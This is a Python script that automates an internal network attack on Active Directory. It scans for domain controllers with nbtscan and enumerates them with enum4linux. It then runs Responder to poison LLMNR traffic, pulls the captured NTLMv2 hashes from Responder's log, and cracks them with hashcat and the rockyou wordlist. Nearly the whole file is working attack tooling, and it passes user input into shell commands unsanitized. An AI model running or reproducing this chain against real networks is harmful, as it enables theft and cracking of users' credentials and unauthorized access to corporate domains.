import re, os, subprocess, netifaces, signal, time

def list_interfaces():
    """ List available network interfaces and return them. """
    return netifaces.interfaces()

def get_interface_ip(interface):
    """ Retrieve the IP address of the specified network interface. """
    try:
        cmd_output = subprocess.check_output(f"ip addr show {interface}", shell=True).decode()
        ip_address = re.search(r"inet (\d+\.\d+\.\d+)\.\d+", cmd_output)
        return ip_address.group(1) if ip_address else None
    except Exception as e:
        print(f"Error retrieving IP for interface {interface}: {e}")
        return None

def run_nbtscan(ip_base):
    """ Run nbtscan on the specified IP base and return the output. """
    try:
        print(f"Doing NBT name scan for addresses from {ip_base}.0/24/")
        return subprocess.check_output(f"sudo nbtscan -r {ip_base}.0/24", shell=True).decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def run_enum4linux(ip, username=None, password=None):
    """ Run enum4linux on the specified IP address and handle output in real time. """
    command = f"enum4linux {ip} -a"
    if username and password:
        command += f" -u {username} -p {password}"
        
    try:
        print(f"Running enum4linux on {ip} with command: {command}")
        time.sleep(2)
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        output = ""
        while True:
            line = process.stdout.readline()
            if not line:
                break
            print(line, end='')  # Print in real time
            output += line
        process.stdout.close()
        process.wait()
        return output
    except subprocess.CalledProcessError as e:
        return e.output.decode()

def basic_ad_enum():
    interfaces = list_interfaces()
    print("Available interfaces:")
    for index, intf in enumerate(interfaces):
        print(f"{index}: {intf}")
    
    index = int(input("Enter the index of the interface you want to use: "))
    if index < 0 or index >= len(interfaces):
        print("Invalid index. Exiting.")
        return
    
    interface = interfaces[index]
    ip_base = get_interface_ip(interface)
    
    if ip_base:
        nbt_output = run_nbtscan(ip_base)
        print(nbt_output)
        
        time.sleep(3)  # Pause for 3 seconds before continuing
        
        dc_ips = re.findall(r"(\d+\.\d+\.\d+\.\d+).*DC", nbt_output)
        all_output = nbt_output + "\n"
        
        for ip in dc_ips:
            auth = input("Do you have an authenticated account the next scan? (yes/no): ").lower()
            username = None
            password = None
            if auth == "yes":
                username = input("Enter username: ")
                password = input("Enter password: ")
            
            enum_output = run_enum4linux(ip, username, password)
            all_output += enum_output + "\n"
        
        try:
            with open("/mnt/data/activedirectory_enum.txt", "w") as f:
                f.write(all_output)
        except IOError as e:
            print(f"Error writing to file: {e}")
    else:
        print("Failed to get IP address for the interface.")

def list_network_interfaces():
    """List all network interfaces."""
    interfaces = netifaces.interfaces()
    print("Available network interfaces:")
    for index, interface in enumerate(interfaces, start=1):
        print(f"{index}. {interface}")
    return interfaces

def choose_network_interface():
    """Allow the user to select a network interface."""
    interfaces = list_network_interfaces()
    choice = input("Enter the number of the network interface you want to use: ")
    try:
        choice = int(choice) - 1
        if choice < 0 or choice >= len(interfaces):
            raise ValueError
        return interfaces[choice]
    except ValueError:
        print("Invalid selection. Please enter a valid number.")
        return None

def sigint_handler(signal, frame):
    """Handle SIGINT signal without exiting the script."""
    print("\nResponder stopped by user. Continuing with the script...")

def llmnr_poisoning():
    interface = choose_network_interface()
    if interface is None:
        return  # Stop if no valid interface is selected

    signal.signal(signal.SIGINT, sigint_handler)  # Setup the SIGINT handler

    # Run Responder on the selected interface
    print(f"Starting Responder on interface {interface}...")
    try:
        process = subprocess.Popen(['sudo', 'responder', '-I', interface])
        process.wait()  # Wait for the process to complete
        print("Responder has completed. Processing NTLM hashes...")
        process_ntlm_hashes()  # Process the hashes after Responder completes
    except subprocess.CalledProcessError as e:
        print(f"Failed to start Responder: {e}")
    finally:
        signal.signal(signal.SIGINT, signal.SIG_DFL)  # Reset the SIGINT handler to default

def process_ntlm_hashes():
    log_file_path = "/usr/share/responder/logs/Responder-Session.log"
    output_file_path = "/mnt/data/ntlmv2-hashes.txt"

    if not os.path.exists(log_file_path):
        print("Log file does not exist, exiting...")
        return

    with open(log_file_path, 'r') as file:
        hashes = set(line.split(': ')[1] for line in file if "NTLMv2-SSP Hash" in line)
    
    with open(output_file_path, 'w') as file:
        file.writelines(f"{hash}\n" for hash in hashes)

def choose_hash():
    hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
    if not os.path.exists(hashes_file_path):
        print("Hashes file does not exist.")
        return None

    with open(hashes_file_path, 'r') as file:
        hashes = [line.strip() for line in file]

    for index, hash in enumerate(hashes, start=1):
        print(f"{index}. {hash}")

    choice = input("Enter the number of the hash you want to crack: ")
    try:
        choice = int(choice) - 1
        if choice < 0 or choice >= len(hashes):
            raise ValueError
        return hashes[choice]
    except ValueError:
        print("Invalid selection. Please enter a valid number.")
        return None

def sigint_handler_crack(signal, frame):
    """Handle SIGINT signal to allow cancellation of hash cracking."""
    print("\nHashcat process interrupted by user. You may choose another action.")

def crack_ntlmv2():
    chosen_hash = choose_hash()
    if chosen_hash:
        hashcat_command = [
            'hashcat', '-m', '5600', chosen_hash, '/usr/share/wordlists/rockyou.txt'
        ]
        try:
            # Set up the SIGINT handler to allow interruption
            signal.signal(signal.SIGINT, sigint_handler_crack)
            
            # Start hashcat with live output
            process = subprocess.Popen(hashcat_command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            # Print output live
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
            
            # Reset the SIGINT handler to default
            signal.signal(signal.SIGINT, signal.SIG_DFL)

            print("Hashcat process completed.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to crack hash: {e}")
        except KeyboardInterrupt:
            # Handle the case where Ctrl+C is pressed while waiting for the command to complete
            print("Hashcat cracking was interrupted by user.")
    else:
        print("No valid hash was selected.")

def list_hashes():
    hashes_file_path = '/mnt/data/ntlmv2-hashes.txt'
    # Check if the file exists before trying to open it
    if os.path.exists(hashes_file_path):
        with open(hashes_file_path, 'r') as file:
            for line in file:
                print(line.strip())
    else:
        print("Hashes file does not exist.")
